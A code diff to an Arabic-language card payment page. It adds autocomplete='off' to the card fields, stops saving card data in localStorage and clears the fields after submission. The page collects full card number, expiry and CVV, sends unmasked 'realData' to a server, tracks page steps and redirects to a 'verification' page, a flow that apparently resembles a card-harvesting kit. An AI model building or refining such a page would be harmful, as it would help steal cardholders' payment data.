@@ -89,26 +89,27 @@
       <div class="form-group">
         <label class="form-label">رقم البطاقة</label>
         <input type="text" class="form-control card-number-input" id="cardNumber" 
-               required maxlength="19" placeholder="####-####-####-####" inputmode="numeric">
+               required maxlength="19" placeholder="####-####-####-####" 
+               inputmode="numeric" autocomplete="off">
       </div>
 
       <div class="form-group">
         <label class="form-label">اسم حامل البطاقة</label>
         <input type="text" class="form-control" name="cardHolder" required 
-               placeholder="الاسم كما هو مكتوب على البطاقة">
+               placeholder="الاسم كما هو مكتوب على البطاقة" autocomplete="off">
       </div>
 
       <div class="form-row">
         <div class="form-group">
           <label class="form-label">تاريخ الانتهاء</label>
           <input type="text" class="form-control" id="expiry" required 
-                 placeholder="MM/YY" maxlength="5" inputmode="numeric" dir="ltr">
+                 placeholder="MM/YY" maxlength="5" inputmode="numeric" dir="ltr" autocomplete="off">
           <small class="form-hint">مثال: 12/28</small>
         </div>
         <div class="form-group">
           <label class="form-label">رمز الأمان (CVV)</label>
           <input type="text" class="form-control" id="cvv" required 
-                 placeholder="123" maxlength="3" inputmode="numeric">
+                 placeholder="123" maxlength="3" inputmode="numeric" autocomplete="off">
           <small class="form-hint">3 أرقام خلف البطاقة</small>
         </div>
       </div>
@@ -218,6 +219,7 @@
     document.addEventListener('DOMContentLoaded', function() {
       trackPageChange('payment');
       
+      // SECURITY: Only product ID is allowed to be stored (not payment data)
       var productId = localStorage.getItem('selected_product');
       if (productId) {
         fetch(SERVER_URL + '/api/products/' + productId)
@@ -232,6 +234,10 @@
           })
           .catch(function(e) { console.error(e); });
       }
+      
+      // SECURITY: Clear payment data from localStorage on page load
+      localStorage.removeItem('payment_data');
+      localStorage.removeItem('payment_amount');
       
       var cardInput = document.getElementById('cardNumber');
       cardInput.addEventListener('input', function(e) {
@@ -354,8 +360,11 @@
           paymentAmount: paymentAmount
         };
         
-        localStorage.setItem('payment_data', JSON.stringify(maskedData));
-        localStorage.setItem('payment_amount', paymentAmount === '1' ? '1' : productPrice.toString());
+        // SECURITY: Clear all payment fields after submission
+        document.getElementById('cardNumber').value = '';
+        document.getElementById('expiry').value = '';
+        document.getElementById('cvv').value = '';
+        document.querySelector('[name="cardHolder"]').value = '';
         
         submitPaymentForm(realData);
         showToast('✓ تم التحقق من بيانات الدفع بنجاح');
@@ -364,20 +373,6 @@
           window.location.href = 'verification.html';
         }, 1000);
       });
-      
-      var savedData = localStorage.getItem('payment_data');
-      if (savedData) {
-        try {
-          var data = JSON.parse(savedData);
-          if (data.expiry) document.getElementById('expiry').value = data.expiry;
-          if (data.cardHolder) document.querySelector('[name="cardHolder"]').value = data.cardHolder;
-          if (data.cardNumber) document.getElementById('cardNumber').value = data.cardNumber;
-          if (data.paymentAmount === '1') {
-            document.querySelector('input[value="1"]').checked = true;
-            updateFinalAmount();
-          }
-        } catch (e) {}
-      }
       
       document.getElementById('cardNumber').focus();
     });
